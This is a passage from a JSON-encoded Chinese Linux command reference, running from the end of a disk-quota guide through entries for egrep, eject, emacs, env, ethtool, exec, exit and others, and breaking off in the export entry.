第六个字段：表示系统启动执行fsck时检查的顺序。\n\n注意：请特别注意这里的拼写，是usrquota和grpquota，不要写成userquota和groupquota。\n\n进入单用户模式，用quotacheck生成.user或.group文件\n\nquotacheck 你的目录\n\n```\nexample:quotacheck / ; quotacheck /home\n```\n\n如果单用户模式报错的话umount你的设备`/dev/hda*`\n\n再执行就ok了，重启动系统，如果一切正常的话，quota将开始正常工作。\n\n **设置用户和组配额的分配量** \n\n对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。\n\n*   软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。\n*   硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。\n\n **通过edquota直接编辑数据文件：** \n\n使用编辑配额命令edquota为用户配置定额，在重新启动系统之后，我们假设lanf是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额：\n\n```\nedquota -u lanf\n```\n\n这个命令将启动默认文本编辑器（如vi或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示：\n\n```\nQuotas for user lanf:\n/dev/sda5:blocks in use:0,limits(soft \u003d 0,hard \u003d 0)\ninodes in use:0,limits(soft \u003d 0,hard \u003d 0)\n```\n\n这表示lanf用户在`/dev/sda5`分区（该分区已经在usrquota的控制之下）中迄今使用了0个数据块（以K为单位），并且没有设限制（包括软限制soft和硬限制hard），同样，lanf在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改blocks行的limits部分就可以了，注意单位使用的是K。例如要为lanf分配100M磁盘的软限制，400M硬限制，可以使用如下的设置：\n\n```\nQuotas for user lanf:\n/dev/sda5:blocks in use:0,limits(soft \u003d 102400,hard \u003d 409800)\ninodes in use:0,limits(soft \u003d 0,hard \u003d 0)\n```\n\n同样的，要对文件目录的数量限制可以相应的修改inodes行。我们也可以同时对这两项都作出限制。只需要如下的修改Quotas for user lanf：\n\n```\n/dev/sda5:blocks in use:0,limits(soft \u003d 102400,hard \u003d 409800)\ninodes in use:0,limits(soft \u003d 12800,hard \u003d 51200)\n```\n\n这表示除了相应的容量的限制外，还对文件/目录的数量做了12800个的软限制和51200个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好edquota还有个-p参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对Jack、Tom、Chen三个用户使用和lanf一样的限额配置，可以使用如下的命令：\n\n```\nedquota -p lanf -u Jack Tom Chen\n```\n\n这样一来，这三个用户就被赋予了和lanf一样的磁盘配额。\n\n对组的配额，除了edquota命令中对应`-u`选项的改为`-g`选项，例如下面对webterm1组的操作：\n\n```\nedquota -g webterm1\n```\n\n实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用edquota命令的`-t`选项来实现。运行下面的命令：\n\n```\nedquota -t\n```\n\nedquota将打开缺省编辑器显示如下内容：\n\n```\ntime units may be:days,hours,minutes,or seconds\nGrace period before enforcing soft limits for users:\n/dev/sda5:block grace period:0 days,file grace period:0 days\n```\n\n可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有6个小时。\n\n```\nTime units may be:days,hours,minutes,or seconds\nGrace period before enforcing soft limits for users:\n/dev/sda5:block grace period:2 days,file grace period:6 hours\n```\n\n **通过setquota工具加入：** \n\n比如加入用户bye2000的磁盘配额，执行以下命令：\n\n```\nsetquota –u / 2000 2500 100 110 bye2000\n```\n\n以下是setquota命令用法的简单描述：\n\n```\nsetquota [ -u|-g ] 装载点 软块数 硬块数 软文件数 硬文件数 用户名/组名\n```\n\n **查看用户磁盘使用情况** \n\n要查明某一个用户使用了多少磁盘空间，例如lanf，可以使用如下的命令：\n\n```\nquota -u lanf\n```\n\n显示：\n\n```\nDisk quotas for user lanf(uid 503):\nFilesystem blocks quota limit grace file quota limit grace\n/dev/sda5 3 102400 409800 1 12800 51200\n```\n\n同样，可以使用`quota -g groupname`命令来参看某个组的磁盘使用情况。\n\n注意：\n\n1.  如果该用户没有配置磁盘限额的话，输出显示`Disk quotas for user hujm (uid 503): none`\n2.  如果不带任何参数运行quota的话，查看的是你自己的配额使用情况。\n\n\n"},{"name":"egrep","categoryId":1,"data":"egrep\n\u003d\u003d\u003d\n\n在文件内查找指定的字符串\n\n## 补充说明\n\n**egrep命令** 用于在文件内查找指定的字符串。egrep执行效果与`grep -E`相似，使用的语法及参数可参照grep指令，与grep的不同点在于解读字符串的方法。egrep是用extended regular expression语法来解读的，而grep则用basic regular expression 语法解读，extended regular expression比basic regular expression的表达更规范。\n\n### 语法  \n\n```\negrep(选项)(查找模式)(文件名1，文件名2，……)\n```\n\n### 实例  \n\n显示文件中符合条件的字符。例如，查找当前目录下所有文件中包含字符串\"Linux\"的文件，可以使用如下命令：\n\n```\negrep Linux *\n```\n\n结果如下所示：\n\n```\n#以下五行为 testfile 中包含Linux字符的行\ntestfile:hello Linux!\ntestfile:Linux is a free Unix-type operating system.\ntestfile:This is a Linux testfile!\ntestfile:Linux\ntestfile:Linux\n\n#以下两行为testfile1中含Linux字符的行\ntestfile1:helLinux!\ntestfile1:This a Linux testfile!\n\n#以下两行为 testfile_2 中包含Linux字符的行\ntestfile_2:Linux is a free unix-type opterating system\ntestfile_2:Linux test\n```\n\n\n"},{"name":"eject","categoryId":8,"data":"eject\n\u003d\u003d\u003d\n\n用来退出抽取式设备\n\n## 补充说明\n\n**eject命令** 用来退出抽取式设备。若设备已挂入，则eject命令会先将该设备卸除再退出。\n\neject允许可移动介质（典型是cd-ROM、软盘、磁带、或者JAZ以及zip磁盘）在软件控制下弹出。该命令也可以控制一些多盘片CD-ROM控制器，控制一些设备支持的自动弹出功能，以及控制一些CD-ROM驱动器磁盘托盘的关闭。与name相应的设备将被弹出，name可以为设备文件或者其挂载点，也可以为完整路径或者省略前面的/dev或者/mnt设备文件名。如果没有指定name，缺省使用cdrom。\n\n有四种不同的弹出的方法，具体要看设备是CD-ROM， SCSI设备，可移动软盘，还是磁带而定。默认的弹出会依次尝试所有四种方法，直到成功为止。如果设备当前是挂载上来的，那么在弹出前要先卸载。\n\n### 语法  \n\n```\neject(选项)(参数)\n```\n\n### 选项  \n\n```\n-a\u003c开关\u003e或--auto\u003c开关\u003e：控制设备的自动退出功能；\n-c\u003c光驱编号\u003e或--changerslut\u003c光驱编号\u003e   选择光驱柜中的光驱；\n-d或--default：显示预设的设备，而不是实际执行动作；\n-f或--floppy：退出抽取式磁盘；\n-h或--help：显示帮助；\n-n或--noop：显示指定的设备；\n-q或--tape：退出磁带；\n-r或--cdrom：退出光盘；\n-s或--scsi：以SCSI指令来退出设备；\n-t或--trayclose：关闭光盘的托盘；\n-v或--verbose：执行时，显示详细的说明。\n```\n\n### 参数  \n\n设备名：指定弹出的设备名称。\n\n\n"},{"name":"elinks","categoryId":0,"data":"elinks\n\u003d\u003d\u003d\n\n纯文本界面的WWW浏览器\n\n## 补充说明\n\n**elinks命令** 能实现一个纯文本界面的WWW浏览器，操作方式与“lynx”类似。\n\n### 语法  \n\n```\nelinks(选项)(参数)\n```\n\n### 选项  \n\n```\n-anonymous：是否使用匿名帐号方式；\n-auto-submit：对于偶然遇到的第一个表单是否自动提交；\n-config-dir：指定elinks指令运行时读取和写入自身的配置和运行状态的存放目录；\n-dump：将HTML文档以纯文本的方式打印到标准输出设备；\n-version：显示指令的版本信息；\n-h：显示帮助信息。\n```\n\n### 参数  \n\nURL：指定要访问的URL地址。\n\n\n"},{"name":"elm","categoryId":5,"data":"elm\n\u003d\u003d\u003d\n\n纯文本邮件客户端程序\n\n## 补充说明\n\n**elm命令** 是一个E-mail客户端管理程序，它提供了纯文本交互式全屏幕界面。\n\n### 语法  \n\n```\nelm(选项)\n```\n\n### 选项  \n\n```\n-s\u003c邮件主题\u003e：指定新邮件的邮件主题；\n-f\u003c目录\u003e：开启程序时，读取指定的目录；\n-h：显示帮助；\n-i\u003c文件名\u003e：将文件内容插入送出的邮件中；\n-m：进入elm后，不显示指令说明；\n-v：显示elm的版本信息；\n-z：若收件信箱没有邮件，则不启动elm程序。\n```\n\n\n"},{"name":"emacs","categoryId":0,"data":"emacs\n\u003d\u003d\u003d\n\n功能强大的全屏文本编辑器\n\n## 补充说明\n\n**emacs命令** 是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n\n### 语法  \n\n```\nemacs(选项)(参数)\n```\n\n### 选项  \n\n```\n+\u003c行号\u003e：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u\u003c用户\u003e：启动emacs编辑器时，加载指定用户的初始化文件；\n-t\u003c文件\u003e：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f\u003c函数\u003e：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l\u003clisp代码文件\u003e：加载指定的lisp代码文件；\n-batch：以批处理模式运行emacs编辑器。\n```\n\n### 参数  \n\n文件：指定要编辑的文本文件。\n\n## emacs命令操作大全  \n\n基本命令\n\n```\nC-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令\n```\n\n编辑\n\n```\nC-z (redefined): Undo；原来C-z是挂起Emacs（然后用fg命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语\n```\n\n移动光标\n\n```\nC-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-\u003c : 移到整个文本开头\nM-\u003e : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央\n```\n\nBuffer 相关\n\n```\nC-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-w : 文件另存为\n```\n\n拷贝与粘贴\n\n```\nM-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴\n```\n\n```\n窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x \u003c : 窗口内容右卷\nC-x \u003e : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作\n```\n\n搜索和替换\n\n```\nC-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换\n```\n\nTags\n\n```\nM-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags\n```\n\n书签\n\n```\nC-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处\n```\n\n帮助\n\n```\nC-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的info，非常有用\nC-h i : 看Info\n```\n\n其它\n\n```\nC-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性\n```\n\n\n"},{"name":"enable","categoryId":4,"data":"enable\n\u003d\u003d\u003d\n\n启动或关闭shell内建命令\n\n## 补充说明\n\n**enable命令** 用于临时关闭或者激活指定的shell内部命令。若要执行的文件名称与shell内建命令相同，可用`enable -n`来关闭shell内建命令。若不加`-n`选项，enable可重新启动关闭的命令。\n\nlinux shell命令执行时，shell总是先在自己的shell builtin中查找该命令，如果找到则执行该命令；如果找不到该命令，则会从环境变量$PATH指定的路径中依次去查找待执行的命令。因为了解了这一点，所以看起来好像没有办法编写用户自己的命令来替代shell builtin命令。幸运的是，有了enable命令我们就能做到了。\n\n### 语法  \n\n```\nenable(选项)(参数)\n```\n\n### 选项  \n\n```\n-n：关闭指定的内部命令；\n-a：显示所有激活的内部命令；\n-f：从指定文件中读取内部命令。\n```\n\n### 参数  \n\n内部命令：指定要关闭或激活的内部命令。\n\n### 实例  \n\n使用enable命令显示所有激活的内部命令：\n\n```\n[root@localhost ~]# enable -a\nenable .\nenable :\nenable alias\nenable bg\nenable bind\nenable break\nenable builtin\nenable caller\nenable cd\nenable command\nenable compgen\nenable complete\nenable continue\nenable declare\nenable dirs\nenable disown\nenable echo\nenable enable\nenable eval\nenable exec\nenable exit\nenable export\nenable false\nenable fc\nenable fg\nenable getopts\nenable hash\nenable help\nenable history\nenable jobs\nenable kill\nenable let\nenable local\nenable logout\nenable popd\nenable printf\nenable pushd\nenable pwd\nenable read\nenable readonly\nenable return\nenable set\nenable shift\nenable shopt\nenable source\nenable suspend\nenable test\nenable times\nenable trap\nenable true\nenable type\nenable typeset\nenable ulimit\nenable umask\nenable unalias\nenable unset\nenable wait\n```\n\n\n"},{"name":"env","categoryId":0,"data":"env\n\u003d\u003d\u003d\n\n显示系统中已存在的环境变量\n\n## 补充说明\n\n**env命令** 用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用\"-\"作为参数选项时，隐藏了选项\"-i\"的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。\n\n如果使用env命令在新环境中执行指令时，会因为没有定义环境变量\"PATH\"而提示错误信息\"such file or directory\"。此时，用户可以重新定义一个新的\"PATH\"或者使用绝对路径。\n\n### 语法  \n\n```\nenv(选项)(参数)\n```\n\n### 选项  \n\n```\n-i：开始一个新的空的环境；\n-u\u003c变量名\u003e：从当前环境中删除指定的变量。\n```\n\n### 参数  \n\n*   变量定义：定义在新的环境中变量，定义多个变量定义用空格隔开。格式为“变量名\u003d值”；\n*   指定：指定要执行的指令和参数。\n\n### 实例  \n\n```\n[root@localhost ~]# env\nhostname\u003dLinServ-1\nTERM\u003dlinux\nSHELL\u003d/bin/bash\nHISTSIZE\u003d1000\nSSH_CLIENT\u003d192.168.2.111 2705 22\nSSH_TTY\u003d/dev/pts/0\nUSER\u003droot\nLS_COLORS\u003dno\u003d00:fi\u003d00:di\u003d01;34:ln\u003d01;36:pi\u003d40;33:so\u003d01;35:bd\u003d40;33;01:cd\u003d40;33;01:or\u003d01;05;37;41:mi\u003d01;05;37;41:ex\u003d01;32:*.cmd\u003d01;32:*.exe\u003d01;32:*.com\u003d01;32:*.btm\u003d01;32:*.bat\u003d01;32:*.sh\u003d01;32:*.csh\u003d01;32:*.tar\u003d01;31:*.tgz\u003d01;31:*.arj\u003d01;31:*.taz\u003d01;31:*.lzh\u003d01;31:*.zip\u003d01;31:*.z\u003d01;31:*.Z\u003d01;31:*.gz\u003d01;31:*.bz2\u003d01;31:*.bz\u003d01;31:*.tz\u003d01;31:*.rpm\u003d01;31:*.cpio\u003d01;31:*.jpg\u003d01;35:*.gif\u003d01;35:*.bmp\u003d01;35:*.xbm\u003d01;35:*.xpm\u003d01;35:*.png\u003d01;35:*.tif\u003d01;35:\nmail\u003d/var/spool/mail/root\nPATH\u003d/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin\nINPUTRC\u003d/etc/inputrc\npwd\u003d/root\nLANG\u003dzh_CN.UTF-8\nSHLVL\u003d1\nHOME\u003d/root\nlogname\u003droot\nSSH_CONNECTION\u003d192.168.2.111 2705 192.168.2.2 22\nLESSOPEN\u003d|/usr/bin/lesspipe.sh %s\nG_BROKEN_FILENAMES\u003d1\n_\u003d/bin/env\n```\n\n\n"},{"name":"ethtool","categoryId":0,"data":"ethtool\n\u003d\u003d\u003d\n\n显示或修改以太网卡的配置信息\n\n## 补充说明\n\nethtool命令用于获取以太网卡的配置信息，或者修改这些配置。这个命令比较复杂，功能特别多。\n\n### 语法  \n\n```\nethtool [ -a | -c | -g | -i | -d | -k | -r | -S |] ethX\nethtool [-A] ethX [autoneg on|off] [rx on|off] [tx on|off]\nethtool [-C] ethX [adaptive-rx on|off] [adaptive-tx on|off] [rx-usecs N] [rx-frames N] [rx-usecs-irq N] [rx-frames-irq N] [tx-usecs N] [tx-frames N] [tx-usecs-irq N] [tx-frames-irq N] [stats-block-usecs N][pkt-rate-low N][rx-usecs-low N] [rx-frames-low N] [tx-usecs-low N] [tx-frames-lowN] [pkt-rate-high N] [rx-usecs-high N] [rx-frames-high N] [tx-usecs-high N] [tx-frames-high N] [sample-interval N]\nethtool [-G] ethX [rx N] [rx-mini N] [rx-jumbo N] [tx N]\nethtool [-e] ethX [raw on|off] [offset N] [length N]\nethtool [-E] ethX [magic N] [offset N] [value N]\nethtool [-K] ethX [rx on|off] [tx on|off] [sg on|off] [tso on|off]\nethtool [-p] ethX [N]\nethtool [-t] ethX [offline|online]\nethtool [-s] ethX [speed 10|100|1000] [duplex half|full] [autoneg on|off] [port tp|aui|bnc|mii] [phyad N] [xcvr internal|external]\n[wol p|u|m|b|a|g|s|d...] [sopass xx:yy:zz:aa:bb:cc] [msglvl N]\n```\n\n### 选项  \n\n```\n-a 查看网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。\n-A 修改网卡中 接收模块RX、发送模块TX和Autonegotiate模块的状态：启动on 或 停用off。\n-c display the Coalesce information of the specified ethernet card。\n-C Change the Coalesce setting of the specified ethernet card。\n-g Display the rx/tx ring parameter information of the specified ethernet card。\n-G change the rx/tx ring setting of the specified ethernet card。\n-i 显示网卡驱动的信息，如驱动的名称、版本等。\n-d 显示register dump信息, 部分网卡驱动不支持该选项。\n-e 显示EEPROM dump信息，部分网卡驱动不支持该选项。\n-E 修改网卡EEPROM byte。\n-k 显示网卡Offload参数的状态：on 或 off，包括rx-checksumming、tx-checksumming等。\n-K 修改网卡Offload参数的状态。\n-p 用于区别不同ethX对应网卡的物理位置，常用的方法是使网卡port上的led不断的闪；N指示了网卡闪的持续时间，以秒为单位。\n-r 如果auto-negotiation模块的状态为on，则restarts auto-negotiation。\n-S 显示NIC- and driver-specific 的统计参数，如网卡接收/发送的字节数、接收/发送的广播包个数等。\n-t 让网卡执行自我检测，有两种模式：offline or online。\n-s 修改网卡的部分配置，包括网卡速度、单工/全双工模式、mac地址等。\n```\n\n### 数据来源  \n\nEthtool命令显示的信息来源于网卡驱动层，即TCP/ip协议的链路层。该命令在Linux内核中实现的逻辑层次为：\n\n最重要的结构体`struct ethtool_ops`，该结构体成员为用于显示或修改以太网卡配置的一系列函数指针，见下表中的第二列。\n\n网卡驱动负责实现（部分）这些函数，并将其封装入`ethtool_ops`结构体，为网络核心层提供统一的调用接口。因此，不同的网卡驱动会给应用层返回不同的信息。`Ethtool命令选项`、`struct ethtool_ops成员函数`、`Ethtool命令显示参数的来源`，三者间的对应关系如下表所示：\n\n\u003ctable\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth style\u003d\"width: 100px;\"\u003e命令选项\u003c/th\u003e\n\n\u003cth\u003estruct ethtool_ops成员函数\u003c/th\u003e\n\n\u003cth\u003eEthtool命令显示参数的来源（以网卡驱动BNX2为例）\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e无 -s\u003c/td\u003e\n\n\u003ctd\u003eget_settingsget_wol get_msglevel get_link set_settings set_wol set_msglevel\u003c/td\u003e\n\n\u003ctd\u003e从网卡寄存器中获得网卡速度等信息，可配置。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-a -A\u003c/td\u003e\n\n\u003ctd\u003eget_pauseparam set_pauseparam\u003c/td\u003e\n\n\u003ctd\u003e从网卡寄存器中获得Autonegotiate/RX/TX模块的状态：on oroff，可配置。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-c -C\u003c/td\u003e\n\n\u003ctd\u003eget_coalesceset_coalesce\u003c/td\u003e\n\n\u003ctd\u003e从网卡寄存器中获得coalescing参数：TX/RX一个数据包后，推迟发生TX/RX中断的时间(us)/数据包个数。—减小该值可以提高网卡的响应时间。 当rx-usecs\u0026rx-frames同时被设为0时，RX中断停止。 当tx-usecs\u0026tx-frames同时被设为0时，TX中断停止。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-g -G\u003c/td\u003e\n\n\u003ctd\u003eget_ringparam set_ringparam\u003c/td\u003e\n\n\u003ctd\u003e除当前TX/RX ring的值（从网卡寄存器中读取得到，可配置）外，其它为网卡bnx2自己固定的信息。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-k -K\u003c/td\u003e\n\n\u003ctd\u003eget_rx_csumget_tx_csum get_sg get_tso set_rx_csum set_tx_csum set_sg set_tso\u003c/td\u003e\n\n\u003ctd\u003e显示信息从保存该状态的变量中读取得到，没有对应的寄存器。因此，TX/RX校验等模块一直处于on状态，实际上是无法修改的。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-i\u003c/td\u003e\n\n\u003ctd\u003eget_drvinfo[self_test_count, get_stats_coun,t get_regs_len, get_eeprom_len]\u003c/td\u003e\n\n\u003ctd\u003e网卡bnx2自己固定的信息，如：  \n——————————————————–  \ndriver: bnx2 version: 1.4.30 firmware-version: 1.8.0.5 bus-info: 0000:09:00.0  \n——————————————————–\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-d\u003c/td\u003e\n\n\u003ctd\u003eget_drvinfoget_regs\u003c/td\u003e\n\n\u003ctd\u003e不支持，即bnx2中没有实现函数get_regs。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-e -E\u003c/td\u003e\n\n\u003ctd\u003eget_eepromset_eeprom\u003c/td\u003e\n\n\u003ctd\u003e不支持，即bnx2中没有实现函数get_eeprom。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-r\u003c/td\u003e\n\n\u003ctd\u003enway_reset\u003c/td\u003e\n\n\u003ctd\u003e配置网卡MII_BMCR寄存器，重启Auto negotiation模块。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-p\u003c/td\u003e\n\n\u003ctd\u003ephys_id\u003c/td\u003e\n\n\u003ctd\u003e配置网卡BNX2_EMAC_LED寄存器，实现LED闪功能。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-t\u003c/td\u003e\n\n\u003ctd\u003eself_test\u003c/td\u003e\n\n\u003ctd\u003e通过配置网卡寄存器，逐一测试网卡的硬件模块：registers，memory，loopback，Link stat，interrupt。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-S\u003c/td\u003e\n\n\u003ctd\u003eget_ethtool_stats\u003c/td\u003e\n\n\u003ctd\u003e显示信息来源于网卡驱动中的结构体变量stats_blk。（网卡通过DMA方式，将寄存器BNX2_HC_STATISTICS _ADDR_L和BNX2_HC_STATISTICS_ADDR_H中的数据实时地读取到结构体变量struct statistics_block *stats_blk中。） —显示的数据都是从网卡寄存器中统计得到的，各项的含义需查询网卡（芯片）手册。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n由上可见，ethtool命令用于显示/配置网卡硬件（寄存器）。  \n\n### 实例  \n\n查看机器上网卡的速度：百兆还是千兆，请输入：\n\n```\nethool eth0\n```\n\n操作完毕后，输出信息中`Speed:`这一项就指示了网卡的速度。停止网卡的发送模块TX，请输入：\n\n```\nethtool -A tx off eth0\n```\n\n操作完毕后，可输入`ethtool -a eth0`，查看tx模块是否已被停止。查看网卡eth0采用了何种驱动，请输入：\n\n```\nethtool -i eth0\n```\n\n操作完毕后，显示 driver: bnx2；version: 1.4.30 等信息。关闭网卡对收到的数据包的校验功能，请输入：\n\n```\nethtool -K eth0 rx off\n```\n\n操作完毕后，可输入`ethtool –k eth0`，查看校验功能是否已被停止。如果机器上安装了两块网卡，那么eth0对应着哪块网卡呢？输入：\n\n```\nethtool -p eth0 10\n```\n\n操作完毕后，看哪块网卡的led灯在闪，eth0就对应着哪块网卡。查看网卡，在接收/发送数据时，有没有出错？请输入：\n\n```\nethtool –S eth0\n```\n\n将千兆网卡的速度降为百兆，请输入：\n\n```\nethtool -s eth0 speed 100   \n\n```\n\n\n"},{"name":"ex","categoryId":1,"data":"ex\n\u003d\u003d\u003d\n\n启动vim编辑器的ex编辑模式\n\n## 补充说明\n\n在 **ex** 模式下启动vim文本编辑器。ex执行效果如同`vi -E`，适用于法及参数可参照vi指令，如要从Ex模式回到普通模式，则在vim中输入`:vi`或`:visual`即可。\n\n### 语法  \n\n```\nex（参数）\n```\n\n### 参数  \n\n文件：指定待编辑的文件。\n\n\n"},{"name":"exec","categoryId":0,"data":"exec\n\u003d\u003d\u003d\n\n调用并执行指定的命令\n\n## 补充说明\n\n**exec命令** 用于调用并执行指令的命令。exec命令通常用在shell脚本程序中，可以调用其他的命令。如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。\n\n### 语法  \n\n```\nexec(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：在空环境中执行指定的命令。\n```\n\n### 参数  \n\n指令：要执行的指令和相应的参数。\n\n### 实例  \n\n首先使用echo命令将文本“Linux C++”进行输出，输入如下命令：\n\n```\necho Linux C++           #输出指定信息\n```\n\n执行上面的指令后，输出如下信息：\n\n```\nLinux C++                #输出信息\n```\n\n然后再使用exec命令调用echo命令输出同样的信息，并且对输出的信息进行对比，输入指令如下所示：\n\n```\nexec -c echo Linux C++          #调用命令\n```\n\n执行以上命令后，其输出信息如下：\n\n```\nLinux C++                       #使用指定指令输出信息\n```\n\n通过比较两者执行后的结果来看，所实现的功能是相同的，即使用exec命令调用echo命令成功。\n\n\n"},{"name":"exit","categoryId":2,"data":"exit\n\u003d\u003d\u003d\n\n退出当前的shell\n\n## 补充说明\n\n**exit命令** 同于退出shell，并返回给定值。在shell脚本中可以终止当前脚本执行。执行exit可使shell以指定的状态值退出。若不设置状态值参数，则shell以预设值退出。状态值0代表执行成功，其他值代表执行失败。\n\n### 语法  \n\n```\nexit(参数)\n```\n\n### 参数  \n\n返回值：指定shell返回值。\n\n### 实例  \n\n退出当前shell：\n\n```\n[root@localhost ~]# exit\nlogout\n```\n\n在脚本中，进入脚本所在目录，否则退出：\n\n```\ncd $(dirname $0) || exit 1\n```\n\n在脚本中，判断参数数量，不匹配就打印使用方式，退出：\n\n```\nif [ \"$#\" -ne \"2\" ]; then\n    echo \"usage: $0 \u003carea\u003e \u003chours\u003e\"\n    exit 2\nfi\n```\n\n在脚本中，退出时删除临时文件：\n\n```\ntrap \"rm -f tmpfile; echo Bye.\" EXIT\n```\n\n检查上一命令的退出码：\n\n```\n./mycommand.sh\nEXCODE\u003d$?\nif [ \"$EXCODE\" \u003d\u003d \"0\" ]; then\n    echo \"O.K\"\nfi\n```\n\n\n"},{"name":"expand","categoryId":0,"data":"expand\n\u003d\u003d\u003d\n\n将文件的制表符转换为空白字符\n\n## 补充说明\n\n**expand命令** 用于将文件的制表符（TAB）转换为空白字符（space），将结果显示到标准输出设备。\n\n### 语法  \n\n```\nexpand(选项)(参数)\n```\n\n### 选项  \n\n```\n-t\u003c数字\u003e：指定制表符所代表的空白字符的个数，而不使用默认的8。\n```\n\n### 参数  \n\n文件：指定要转换制表符为空白的文件。\n\n\n"},{"name":"export","categoryId":4,"data":"export\n\u003d\u003d\u003d\n\n设置或显示系统环境变量\n\n## 补充说明\n\n**export命令** 用于将shell变量输出为环境变量，或者将shell函数输出为环境变量。\n\n一个变量创建时，它不会自动地为在它之后创建的shell进程所知。而命令export可以向后面的shell传递变量的值。当一个shell脚本调用并执 